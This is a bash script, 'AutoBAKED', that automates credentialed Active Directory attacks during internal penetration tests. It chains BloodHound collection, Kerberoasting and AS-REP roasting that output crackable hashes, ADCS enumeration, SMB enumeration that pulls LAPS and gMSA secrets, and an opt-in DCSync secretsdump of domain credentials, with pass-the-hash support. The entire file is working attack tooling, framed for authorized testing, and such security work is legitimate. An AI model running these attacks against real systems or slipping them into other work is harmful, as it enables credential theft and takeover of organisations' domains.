#!/bin/bash
#
# AutoBAKED - Automated Bloodhound, AD Enumeration, Kerberoasting, Etc. Dingleberry?
#
# Runs a gamut of *credentialed* AD attacks/enumeration during an internal pentest and
# saves the full output of every tool as evidence.
#
# Modules:
#   - BloodHound collection   (bloodhound-python)
#   - Kerberoasting           (impacket-GetUserSPNs)
#   - AS-REP roasting         (impacket-GetNPUsers)
#   - ADCS enumeration        (certipy find)
#   - SMB enum suite          (netexec)              [opt-in]
#   - Secretsdump / DCSync    (impacket-secretsdump) [aggressive, --dump only]
#
# Authentication: password (-p) OR NTLM hash / pass-the-hash (-H).
#
# Original by Chris McMahon and Kyle Hoehn.
#
# NOTE: like all tools that take creds on the command line, the underlying binaries expose
#       credentials in the process list (`ps`) while running. Passwords are masked in this
#       script's own logs, but that OS-level exposure is unavoidable.

# We deliberately do NOT use `set -e`: a single module failing must not abort the run and
# lose the evidence from the others. Errors are handled per-module (continue-on-error).
set -uo pipefail

# ---------------------------------------------------------------------------------------
# Colors
# ---------------------------------------------------------------------------------------
RED="\033[31m"
GREEN="\033[32m"
YELLOW="\033[33m"
NC="\033[0m"
BLUE="\033[1;34m"
BLUE2="\033[0;34m"
RESET="\033[0m"
BOLD="\e[1m"

# ---------------------------------------------------------------------------------------
# Globals / defaults
# ---------------------------------------------------------------------------------------
VERSION="2.0"
username="" ; password="" ; hashes="" ; domain=""
dc_ip="" ; dc_hostname="" ; targets="" ; outbase="."
assume_yes=0
lmnt="" ; nt_only="" ; auth_mode=""   # auth_mode = password | hash
dc_ok=0
MASTER_LOG=""
OUTDIR=""

# Module selection (0/1). dump is aggressive and only ever enabled explicitly.
declare -A SEL=( [bloodhound]=0 [kerberoast]=0 [asrep]=0 [certipy]=0 [smb]=0 [dump]=0 )
# Menu default profile (low-impact; smb + dump stay off unless chosen).
declare -A DEFAULTS=( [bloodhound]=1 [kerberoast]=1 [asrep]=1 [certipy]=1 [smb]=0 [dump]=0 )
# Low-impact modules (used by --all and the menu's "toggle all"; never includes dump).
LOW_IMPACT=(bloodhound kerberoast asrep certipy smb)

# Resolved tool binaries (filled by resolve_tools()).
BH_BIN="" ; SPN_BIN="" ; NP_BIN="" ; CERTIPY_BIN="" ; NXC_BIN="" ; SECRETS_BIN=""

# Summary tracking.
declare -A MOD_STATUS   # ok | failed | partial | skipped
declare -A MOD_INFO     # short note / metric

# ---------------------------------------------------------------------------------------
# Banner
# ---------------------------------------------------------------------------------------
banner() {
echo -e "${RED}"
echo -e " ##################################################################################"
echo -e "#${BLUE}░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░${RED}#"
echo -e "#${BLUE}░░      ░░  ░░░░  ░        ░░      ░░       ░░░      ░░  ░░░   ░        ░       ░░${RED}#"
echo -e "#${BLUE}▒  ▒▒▒▒  ▒  ▒▒▒▒  ▒▒▒▒  ▒▒▒▒  ▒▒▒▒  ▒  ▒▒▒▒  ▒  ▒▒▒▒  ▒  ▒▒   ▒▒  ▒▒▒▒▒▒▒  ▒▒▒▒  ▒${RED}#"
echo -e "#${BLUE}▓  ▓▓▓▓  ▓  ▓▓▓▓  ▓▓▓▓  ▓▓▓▓  ▓▓▓▓  ▓       ▓▓  ▓▓▓▓  ▓      ▓▓▓      ▓▓▓  ▓▓▓▓  ▓${RED}#"
echo -e "#${BLUE}█        █  ████  ████  ████  ████  █  ████  █        █  ██   ██  ███████  ████  █${RED}#"
echo -e "#${BLUE}█  ████  ██      █████  █████      ██       ██  ████  █  ███   █        █       ██${RED}#"
echo -e "#${BLUE}██████████████████████████████████████████████████████████████████████████████████${RED}#"
echo -e "#${BLUE2}█████  ${BOLD}Auto${BLUE2}mated ${BOLD}B${BLUE2}loodhound ${BOLD}A${BLUE2}D Enumeration ${BOLD}K${BLUE2}erberoasting${BOLD} E${BLUE2}tc. ${BOLD}D${BLUE2}ingleberry?  ██████${RED}#"
echo -e "#${BLUE2}▓▓▓▓▓▓▓▓▓▓▓▓                    Script Version ${VERSION}                    ▓▓▓▓▓▓▓▓▓▓▓▓${RED}#"
echo -e "#${BLUE}▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒                                      ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒${RED}#"
echo -e "#${BLUE2}░░░░░░░░░░░░░░░░░░░░░░    by Chris McMahon and Kyle Hoehn   ░░░░░░░░░░░░░░░░░░░░░░${RED}#"
echo -e "#${BLUE}░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░${RED}#"
echo -e " ##################################################################################"
echo -e "${RESET}"
}

# ---------------------------------------------------------------------------------------
# Logging helpers (echo to console + append to master log if it exists)
# ---------------------------------------------------------------------------------------
_tolog() { [ -n "$MASTER_LOG" ] && printf '%s\n' "$1" >>"$MASTER_LOG" 2>/dev/null || true; }
info() { echo -e "${GREEN}[*]${NC} $*"; _tolog "[*] $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; _tolog "[!] $*"; }
err()  { echo -e "${RED}[x]${NC} $*"; _tolog "[x] $*"; }
ok()   { echo -e "${GREEN}[+]${NC} $*"; _tolog "[+] $*"; }
section() { echo -e "\n${BLUE}==== $* ====${NC}"; _tolog ""; _tolog "==== $* ===="; }

# Print a command line with the password masked (for evidence / repro).
mask_cmd() {
  local out="" tok
  for tok in "$@"; do
    if [ -n "$password" ]; then tok="${tok//$password/********}"; fi
    if [[ "$tok" =~ [[:space:]] ]]; then out+=" '$tok'"; else out+=" $tok"; fi
  done
  echo "${out# }"
}

# Run a command, tee combined output to a per-tool logfile AND the master log AND console.
# Returns the command's real exit code.
run_logged() {
  local logfile="$1"; shift
  info "run: $(mask_cmd "$@")"
  printf '### %s\n' "$(mask_cmd "$@")" >>"$logfile" 2>/dev/null
  "$@" 2>&1 | tee -a "$logfile" "$MASTER_LOG"
  return "${PIPESTATUS[0]}"
}

# ---------------------------------------------------------------------------------------
# Usage
# ---------------------------------------------------------------------------------------
usage() {
    cat << EOF
AutoBAKED v${VERSION} - automated credentialed AD attacks/enumeration

Usage: $0 -u <user> (-p <pass> | -H <[LM:]NT>) -d <domain> [module flags] [options]

Required:
  -u, --user <user>         Username for authentication.
  -d, --domain <domain>     Target AD domain (FQDN, e.g. corp.local).
  One of:
  -p, --password <pass>     Password (prompted if neither -p nor -H is given).
  -H, --hashes <[LM:]NT>    NTLM hash for pass-the-hash (bare NT hash is fine).

Options:
  -i, --dc-ip <ip>          Domain Controller IP (auto-discovered via DNS SRV if omitted).
  -t, --targets <file>      Target list for the SMB module (defaults to the DC if omitted).
  -o, --output <dir>        Base directory for the loot folder (default: current dir).
  -y, --yes                 Non-interactive: no menu, no install prompts.
  -h, --help                Show this help.

Module flags (if none given on a terminal, an interactive menu is shown):
  --bloodhound              BloodHound collection (bloodhound-python).
  --kerberoast              Kerberoasting (impacket-GetUserSPNs).
  --asrep                   AS-REP roasting (impacket-GetNPUsers).
  --certipy                 ADCS enumeration (certipy find).
  --smb                     SMB enum suite (netexec).                 [opt-in]
  --all                     All low-impact modules above (NEVER enables --dump).
  --dump                    AGGRESSIVE: secretsdump / DCSync. Explicit opt-in only.

Examples:
  $0 -u jdoe -p 'P@ss' -d corp.local                 # interactive menu
  $0 -u jdoe -p 'P@ss' -d corp.local --all -y        # every low-impact module
  $0 -u jdoe -H aad3b...:5f4dcc... -d corp.local --kerberoast --asrep
  $0 -u jdoe -p 'P@ss' -d corp.local --smb -t hosts.txt
EOF
    exit "${1:-1}"
}

# ---------------------------------------------------------------------------------------
# Argument parsing (short + long options, manual loop)
# ---------------------------------------------------------------------------------------
any_module_flag=0
parse_args() {
  while [ $# -gt 0 ]; do
    case "$1" in
      -u|--user)     username="${2:-}"; shift 2 ;;
      -p|--password) password="${2:-}"; shift 2 ;;
      -H|--hashes)   hashes="${2:-}"; shift 2 ;;
      -d|--domain)   domain="${2:-}"; shift 2 ;;
      -i|--dc-ip)    dc_ip="${2:-}"; shift 2 ;;
      -t|--targets)  targets="${2:-}"; shift 2 ;;
      -o|--output)   outbase="${2:-}"; shift 2 ;;
      -y|--yes)      assume_yes=1; shift ;;
      -h|--help)     usage 0 ;;
      --bloodhound)  SEL[bloodhound]=1; any_module_flag=1; shift ;;
      --kerberoast)  SEL[kerberoast]=1; any_module_flag=1; shift ;;
      --asrep)       SEL[asrep]=1; any_module_flag=1; shift ;;
      --certipy)     SEL[certipy]=1; any_module_flag=1; shift ;;
      --smb)         SEL[smb]=1; any_module_flag=1; shift ;;
      --dump)        SEL[dump]=1; any_module_flag=1; shift ;;
      --all)         local m; for m in "${LOW_IMPACT[@]}"; do SEL[$m]=1; done; any_module_flag=1; shift ;;
      *) err "Unknown option: $1"; usage ;;
    esac
  done
}

# ---------------------------------------------------------------------------------------
# Interactive module-selection menu (pure bash toggle loop)
# ---------------------------------------------------------------------------------------
mark() { [ "${SEL[$1]}" -eq 1 ] && echo "x" || echo " "; }

menu() {
  local m
  for m in "${!DEFAULTS[@]}"; do SEL[$m]="${DEFAULTS[$m]}"; done
  while true; do
    echo
    echo -e "${BOLD}Select modules to run:${NC}"
    echo -e "  [$(mark bloodhound)] 1) BloodHound collection      (bloodhound-python)"
    echo -e "  [$(mark kerberoast)] 2) Kerberoasting              (impacket-GetUserSPNs)"
    echo -e "  [$(mark asrep)] 3) AS-REP roasting            (impacket-GetNPUsers)"
    echo -e "  [$(mark certipy)] 4) Certipy / ADCS enum        (certipy find)"
    echo -e "  [$(mark smb)] 5) SMB enum suite             (netexec)          ${YELLOW}[opt-in]${NC}"
    echo -e "  [$(mark dump)] 6) secretsdump / DCSync       ${RED}[AGGRESSIVE]${NC}"
    echo -e "   ${BOLD}a${NC}) toggle all low-impact   ${BOLD}r${NC}) run selected   ${BOLD}q${NC}) quit"
    read -r -p "  > " choice
    case "$choice" in
      1) SEL[bloodhound]=$((1-SEL[bloodhound])) ;;
      2) SEL[kerberoast]=$((1-SEL[kerberoast])) ;;
      3) SEL[asrep]=$((1-SEL[asrep])) ;;
      4) SEL[certipy]=$((1-SEL[certipy])) ;;
      5) SEL[smb]=$((1-SEL[smb])) ;;
      6) SEL[dump]=$((1-SEL[dump]))
         [ "${SEL[dump]}" -eq 1 ] && warn "secretsdump/DCSync is HIGH IMPACT - use with authorization." ;;
      a|A)
         # Toggle all low-impact together; never touches the aggressive module (#6).
         local all_on=1
         for m in "${LOW_IMPACT[@]}"; do [ "${SEL[$m]}" -eq 0 ] && all_on=0; done
         local newv=$((1-all_on))
         for m in "${LOW_IMPACT[@]}"; do SEL[$m]=$newv; done ;;
      r|R) return 0 ;;
      q|Q) info "Nothing to do. Bye."; exit 0 ;;
      *) warn "Unrecognized choice: $choice" ;;
    esac
  done
}

selected_count() {
  local m c=0
  for m in "${!SEL[@]}"; do [ "${SEL[$m]}" -eq 1 ] && c=$((c+1)); done
  echo "$c"
}

# ---------------------------------------------------------------------------------------
# Tool resolution + preflight install
# ---------------------------------------------------------------------------------------
resolve_one() {
  local c
  for c in "$@"; do
    if command -v "$c" >/dev/null 2>&1; then echo "$c"; return 0; fi
  done
  echo ""; return 1
}

resolve_tools() {
  BH_BIN=$(resolve_one bloodhound-python bloodhound.py)
  SPN_BIN=$(resolve_one impacket-GetUserSPNs GetUserSPNs.py impacket-getuserspns)
  NP_BIN=$(resolve_one impacket-GetNPUsers GetNPUsers.py impacket-getnpusers)
  CERTIPY_BIN=$(resolve_one certipy certipy-ad)
  NXC_BIN=$(resolve_one netexec nxc)
  SECRETS_BIN=$(resolve_one impacket-secretsdump secretsdump.py)
}

# Map a module to the binary it needs and the install "key".
module_bin() {
  case "$1" in
    bloodhound) echo "$BH_BIN" ;;
    kerberoast) echo "$SPN_BIN" ;;
    asrep)      echo "$NP_BIN" ;;
    certipy)    echo "$CERTIPY_BIN" ;;
    smb)        echo "$NXC_BIN" ;;
    dump)       echo "$SECRETS_BIN" ;;
  esac
}
module_instkey() {
  case "$1" in
    bloodhound)          echo bloodhound ;;
    kerberoast|asrep|dump) echo impacket ;;
    certipy)             echo certipy ;;
    smb)                 echo netexec ;;
  esac
}

try_install() {
  local key="$1" pipx_pkg="" apt_pkg=""
  case "$key" in
    bloodhound) pipx_pkg="bloodhound"; apt_pkg="bloodhound.py" ;;
    impacket)   pipx_pkg="impacket";   apt_pkg="impacket-scripts" ;;
    netexec)    pipx_pkg="git+https://github.com/Pennyw0rth/NetExec"; apt_pkg="netexec" ;;
    certipy)    pipx_pkg="certipy-ad"; apt_pkg="certipy" ;;
    *) return 1 ;;
  esac
  if command -v pipx >/dev/null 2>&1; then
    info "Installing '$key' via pipx..."
    pipx install "$pipx_pkg" && return 0
    warn "pipx install of '$key' failed; trying apt-get..."
  fi
  if command -v apt-get >/dev/null 2>&1; then
    info "Installing '$key' via apt-get (may prompt for sudo)..."
    sudo apt-get install -y "$apt_pkg" && return 0
  fi
  return 1
}

preflight() {
  resolve_tools
  # Which install keys are missing among selected modules?
  local m key ; declare -A missing_keys=()
  for m in "${!SEL[@]}"; do
    [ "${SEL[$m]}" -eq 1 ] || continue
    if [ -z "$(module_bin "$m")" ]; then
      key=$(module_instkey "$m")
      missing_keys[$key]=1
    fi
  done

  if [ "${#missing_keys[@]}" -gt 0 ]; then
    warn "Missing tools for selected modules: ${!missing_keys[*]}"
    local do_install=0
    if [ "$assume_yes" -eq 1 ]; then
      warn "--yes set: not auto-installing. Affected modules will be skipped."
    else
      read -r -p "$(echo -e "${YELLOW}[?]${NC}") Attempt to install the missing tools now? [y/N] " ans
      [[ "$ans" =~ ^[Yy]$ ]] && do_install=1
    fi
    if [ "$do_install" -eq 1 ]; then
      for key in "${!missing_keys[@]}"; do
        try_install "$key" || warn "Could not install '$key'."
      done
      resolve_tools   # re-check after install
    fi
  fi

  # Any module whose binary is still missing gets skipped (never abort the run).
  for m in "${!SEL[@]}"; do
    [ "${SEL[$m]}" -eq 1 ] || continue
    if [ -z "$(module_bin "$m")" ]; then
      warn "Skipping '$m' - required tool not available."
      SEL[$m]=0
      MOD_STATUS[$m]="skipped"
      MOD_INFO[$m]="required tool missing"
    fi
  done
}

# ---------------------------------------------------------------------------------------
# Domain Controller discovery
# ---------------------------------------------------------------------------------------
discover_dc() {
  if [ -n "$dc_ip" ]; then
    info "Using provided Domain Controller IP: $dc_ip"
    dc_hostname="${dc_hostname:-$dc_ip}"
    dc_ok=1
    return 0
  fi
  info "No DC IP provided. Attempting DNS SRV discovery for '$domain'..."
  if ! command -v host >/dev/null 2>&1; then
    warn "'host' not found; cannot auto-discover a DC. Provide one with -i."
    return 1
  fi
  dc_hostname=$(host -t SRV "_ldap._tcp.dc._msdcs.$domain" 2>/dev/null | head -n1 | awk '{print $NF}' | sed 's/\.$//')
  if [ -z "$dc_hostname" ]; then
    warn "Failed to locate a Domain Controller for '$domain' via DNS."
    return 1
  fi
  if command -v getent >/dev/null 2>&1; then
    dc_ip=$(getent ahosts "$dc_hostname" 2>/dev/null | awk '{print $1; exit}')
  fi
  if [ -z "$dc_ip" ]; then
    warn "Resolved DC hostname '$dc_hostname' but could not resolve its IP."
    return 1
  fi
  ok "Discovered Domain Controller: $dc_hostname ($dc_ip)"
  dc_ok=1
  return 0
}

need_dc() {
  # True if any selected module needs a DC.
  local m
  for m in bloodhound kerberoast asrep certipy dump; do
    [ "${SEL[$m]:-0}" -eq 1 ] && return 0
  done
  return 1
}

# ---------------------------------------------------------------------------------------
# Modules
# ---------------------------------------------------------------------------------------
require_dc_or_skip() {
  local m="$1"
  if [ "$dc_ok" -ne 1 ]; then
    warn "Skipping '$m' - no Domain Controller available (use -i)."
    MOD_STATUS[$m]="skipped"; MOD_INFO[$m]="no DC"
    return 1
  fi
  return 0
}

mod_bloodhound() {
  section "BloodHound collection (bloodhound-python)"
  require_dc_or_skip bloodhound || return
  local d="$OUTDIR/bloodhound"; mkdir -p "$d"
  local log="$d/bloodhound.log"
  local cmd=("$BH_BIN" -u "$username" -d "$domain" -dc "$dc_hostname" -ns "$dc_ip" -c all --zip)
  if [ "$auth_mode" = "hash" ]; then cmd+=(--hashes "$lmnt"); else cmd+=(-p "$password"); fi
  ( cd "$d" && run_logged "$log" "${cmd[@]}" )
  local rc=$?
  # bloodhound-python writes into cwd; retry over TCP if the first pass produced no zip.
  if [ "$rc" -ne 0 ] && ! ls "$d"/*.zip >/dev/null 2>&1; then
    warn "BloodHound failed; retrying with --dns-tcp..."
    ( cd "$d" && run_logged "$log" "${cmd[@]}" --dns-tcp )
  fi
  local zip; zip=$(ls -1t "$d"/*.zip 2>/dev/null | head -n1)
  if [ -n "$zip" ]; then
    MOD_STATUS[bloodhound]="ok"; MOD_INFO[bloodhound]="zip: $(basename "$zip")"
    ok "BloodHound data collected -> $zip"
  else
    MOD_STATUS[bloodhound]="failed"; MOD_INFO[bloodhound]="see $log"
    err "BloodHound collection failed (see $log)."
  fi
}

mod_kerberoast() {
  section "Kerberoasting (impacket-GetUserSPNs)"
  require_dc_or_skip kerberoast || return
  local d="$OUTDIR/kerberoast"; mkdir -p "$d"
  local log="$d/GetUserSPNs.log" hfile="$d/hashes_kerberoast.hashcat"
  local cmd=("$SPN_BIN")
  if [ "$auth_mode" = "hash" ]; then cmd+=("$domain/$username" -hashes "$lmnt"); else cmd+=("$domain/$username:$password"); fi
  cmd+=(-dc-ip "$dc_ip" -request -outputfile "$hfile")
  run_logged "$log" "${cmd[@]}"
  local rc=$?
  local n=0; [ -f "$hfile" ] && n=$(grep -c 'krb5tgs' "$hfile" 2>/dev/null || echo 0)
  if [ "$rc" -eq 0 ]; then
    MOD_STATUS[kerberoast]="ok"; MOD_INFO[kerberoast]="$n hash(es) -> $(basename "$hfile")"
    ok "Kerberoasting done ($n hash(es)). Full output: $log"
  else
    MOD_STATUS[kerberoast]="failed"; MOD_INFO[kerberoast]="see $log"
    err "Kerberoasting failed (see $log)."
  fi
}

mod_asrep() {
  section "AS-REP roasting (impacket-GetNPUsers)"
  require_dc_or_skip asrep || return
  local d="$OUTDIR/asrep"; mkdir -p "$d"
  local log="$d/GetNPUsers.log" hfile="$d/hashes_asrep.hashcat"
  local cmd=("$NP_BIN")
  if [ "$auth_mode" = "hash" ]; then cmd+=("$domain/$username" -hashes "$lmnt"); else cmd+=("$domain/$username:$password"); fi
  cmd+=(-dc-ip "$dc_ip" -request -outputfile "$hfile")
  run_logged "$log" "${cmd[@]}"
  local rc=$?
  local n=0; [ -f "$hfile" ] && n=$(grep -c 'krb5asrep' "$hfile" 2>/dev/null || echo 0)
  if [ "$rc" -eq 0 ]; then
    MOD_STATUS[asrep]="ok"; MOD_INFO[asrep]="$n hash(es) -> $(basename "$hfile")"
    ok "AS-REP roasting done ($n hash(es)). Full output: $log"
  else
    MOD_STATUS[asrep]="failed"; MOD_INFO[asrep]="see $log"
    err "AS-REP roasting failed (see $log)."
  fi
}

mod_certipy() {
  section "ADCS enumeration (certipy find)"
  require_dc_or_skip certipy || return
  local d="$OUTDIR/certipy"; mkdir -p "$d"
  local log="$d/find.log"
  # First pass: human-readable vulnerable-template summary to console + log.
  local cmd=("$CERTIPY_BIN" find -u "$username@$domain")
  if [ "$auth_mode" = "hash" ]; then cmd+=(-hashes "$lmnt"); else cmd+=(-p "$password"); fi
  cmd+=(-dc-ip "$dc_ip" -vulnerable -stdout)
  run_logged "$log" "${cmd[@]}"
  local rc=$?
  # Second pass: full machine-readable evidence files (.json/.txt/BloodHound zip).
  local cmd2=("$CERTIPY_BIN" find -u "$username@$domain")
  if [ "$auth_mode" = "hash" ]; then cmd2+=(-hashes "$lmnt"); else cmd2+=(-p "$password"); fi
  cmd2+=(-dc-ip "$dc_ip" -output "$d/certipy")
  ( cd "$d" && run_logged "$log" "${cmd2[@]}" ) || true
  local nvuln=0; [ -f "$log" ] && nvuln=$(grep -c 'ESC' "$log" 2>/dev/null || echo 0)
  if [ "$rc" -eq 0 ]; then
    MOD_STATUS[certipy]="ok"; MOD_INFO[certipy]="$nvuln ESC hit(s) noted -> $d"
    ok "Certipy enumeration done. Full output: $log"
  else
    MOD_STATUS[certipy]="failed"; MOD_INFO[certipy]="see $log"
    err "Certipy enumeration failed (see $log)."
  fi
}

mod_smb() {
  section "SMB enum suite (netexec)"
  local d="$OUTDIR/smb"; mkdir -p "$d"
  # Resolve targets: explicit file, else fall back to the DC IP.
  local tfile="$targets"
  if [ -z "$tfile" ]; then
    if [ -n "$dc_ip" ]; then
      tfile="$d/targets.txt"; echo "$dc_ip" > "$tfile"
      warn "No -t targets file given; defaulting SMB targets to the DC ($dc_ip)."
    else
      warn "Skipping SMB - no targets file (-t) and no DC IP available."
      MOD_STATUS[smb]="skipped"; MOD_INFO[smb]="no targets"; return
    fi
  elif [ ! -f "$tfile" ]; then
    warn "Skipping SMB - targets file '$tfile' not found."
    MOD_STATUS[smb]="skipped"; MOD_INFO[smb]="targets file missing"; return
  fi

  local base=("$NXC_BIN" smb "$tfile" -u "$username")
  if [ "$auth_mode" = "hash" ]; then base+=(-H "$nt_only"); else base+=(-p "$password"); fi

  local runs=(
    "shares|--shares"
    "users|--users"
    "groups|--groups"
    "pass-pol|--pass-pol"
    "loggedon|--loggedon-users"
    "sessions|--sessions"
    "maq|-M|maq"
    "laps|-M|laps"
    "gmsa|--gmsa"
  )
  local entry name rest fails=0 total=0
  for entry in "${runs[@]}"; do
    IFS='|' read -r name rest <<< "$entry"
    local extra=()
    IFS='|' read -r -a extra <<< "$rest"
    total=$((total+1))
    run_logged "$d/${name}.log" "${base[@]}" "${extra[@]}"
    [ "$?" -ne 0 ] && fails=$((fails+1))
  done
  if [ "$fails" -eq 0 ]; then
    MOD_STATUS[smb]="ok"; MOD_INFO[smb]="$total checks -> $d"
    ok "SMB enum suite complete ($total checks). Output: $d"
  elif [ "$fails" -lt "$total" ]; then
    MOD_STATUS[smb]="partial"; MOD_INFO[smb]="$((total-fails))/$total ok -> $d"
    warn "SMB enum suite partial ($fails/$total checks failed). Output: $d"
  else
    MOD_STATUS[smb]="failed"; MOD_INFO[smb]="see $d"
    err "SMB enum suite failed (see $d)."
  fi
}

mod_dump() {
  section "secretsdump / DCSync (impacket-secretsdump)  [AGGRESSIVE]"
  require_dc_or_skip dump || return
  warn "This performs a DCSync (-just-dc) and dumps domain credential material."
  warn "Only run with explicit written authorization for this engagement."
  local d="$OUTDIR/aggressive"; mkdir -p "$d"
  local log="$d/secretsdump.log"
  local cmd=("$SECRETS_BIN")
  if [ "$auth_mode" = "hash" ]; then cmd+=("$domain/$username@$dc_ip" -hashes "$lmnt"); else cmd+=("$domain/$username:$password@$dc_ip"); fi
  cmd+=(-just-dc -outputfile "$d/secrets")
  run_logged "$log" "${cmd[@]}"
  local rc=$?
  local n=0; [ -f "$d/secrets.ntds" ] && n=$(wc -l < "$d/secrets.ntds" 2>/dev/null || echo 0)
  if [ "$rc" -eq 0 ]; then
    MOD_STATUS[dump]="ok"; MOD_INFO[dump]="$n NTDS line(s) -> $d/secrets.*"
    ok "secretsdump complete. Output: $log"
  else
    MOD_STATUS[dump]="failed"; MOD_INFO[dump]="see $log"
    err "secretsdump failed (see $log)."
  fi
}

# ---------------------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------------------
write_summary() {
  local sfile="$OUTDIR/SUMMARY.txt"
  {
    echo "AutoBAKED v${VERSION} run summary"
    echo "Domain : $domain"
    echo "User   : $username"
    echo "DC     : ${dc_hostname:-?} (${dc_ip:-?})"
    echo "Auth   : $auth_mode"
    echo "Output : $OUTDIR"
    echo
    printf '%-12s %-9s %s\n' "MODULE" "STATUS" "NOTE"
    printf '%-12s %-9s %s\n' "------" "------" "----"
    local m
    for m in bloodhound kerberoast asrep certipy smb dump; do
      [ -n "${MOD_STATUS[$m]:-}" ] || continue
      printf '%-12s %-9s %s\n' "$m" "${MOD_STATUS[$m]}" "${MOD_INFO[$m]:-}"
    done
  } | tee "$sfile"
  _tolog "Summary written to $sfile"
}

# ---------------------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------------------
main() {
  banner
  parse_args "$@"

  # Validate required parameters.
  [ -n "$username" ] || { err "Missing -u <user>."; usage; }
  [ -n "$domain" ]   || { err "Missing -d <domain>."; usage; }

  # Authentication mode.
  if [ -n "$hashes" ]; then
    auth_mode="hash"
    if [[ "$hashes" == *:* ]]; then lmnt="$hashes"; else lmnt=":$hashes"; fi
    nt_only="${lmnt##*:}"
  elif [ -n "$password" ]; then
    auth_mode="password"
  else
    read -r -s -p "Password for $username@$domain: " password; echo
    [ -n "$password" ] || { err "No password or hash provided."; exit 1; }
    auth_mode="password"
  fi

  # Decide module selection.
  if [ "$any_module_flag" -eq 1 ]; then
    :  # use flags as-is
  elif [ "$assume_yes" -eq 1 ]; then
    local m; for m in "${!DEFAULTS[@]}"; do SEL[$m]="${DEFAULTS[$m]}"; done
    info "--yes with no module flags: running default low-impact profile."
  elif [ -t 0 ]; then
    menu
  else
    err "No modules selected and no terminal for the menu. Pass module flags or --all."
    exit 1
  fi

  [ "$(selected_count)" -gt 0 ] || { err "No modules selected."; exit 0; }

  # Preflight tool check (+ optional install), may downgrade some selections to skipped.
  preflight
  [ "$(selected_count)" -gt 0 ] || { err "No runnable modules after tool check."; exit 1; }

  # DC discovery if needed.
  if need_dc; then discover_dc || warn "Continuing; DC-dependent modules will be skipped."; fi

  # Create loot dir + master log.
  local ts; ts=$(date +'%Y%m%d_%H%M%S')
  OUTDIR="${outbase%/}/autobaked-loot_${domain}_${ts}"
  mkdir -p "$OUTDIR" || { err "Could not create output dir '$OUTDIR'."; exit 1; }
  MASTER_LOG="$OUTDIR/autobaked.log"
  : > "$MASTER_LOG"
  info "Loot directory: $OUTDIR"
  local sel_list=""
  for m in bloodhound kerberoast asrep certipy smb dump; do [ "${SEL[$m]}" -eq 1 ] && sel_list+="$m "; done
  info "Selected modules: $sel_list"

  # Run selected modules (continue-on-error).
  [ "${SEL[bloodhound]}" -eq 1 ] && mod_bloodhound
  [ "${SEL[kerberoast]}" -eq 1 ] && mod_kerberoast
  [ "${SEL[asrep]}" -eq 1 ]      && mod_asrep
  [ "${SEL[certipy]}" -eq 1 ]    && mod_certipy
  [ "${SEL[smb]}" -eq 1 ]        && mod_smb
  [ "${SEL[dump]}" -eq 1 ]       && mod_dump

  section "Summary"
  write_summary
  ok "All selected tasks finished. Evidence in: $OUTDIR"
}

main "$@"
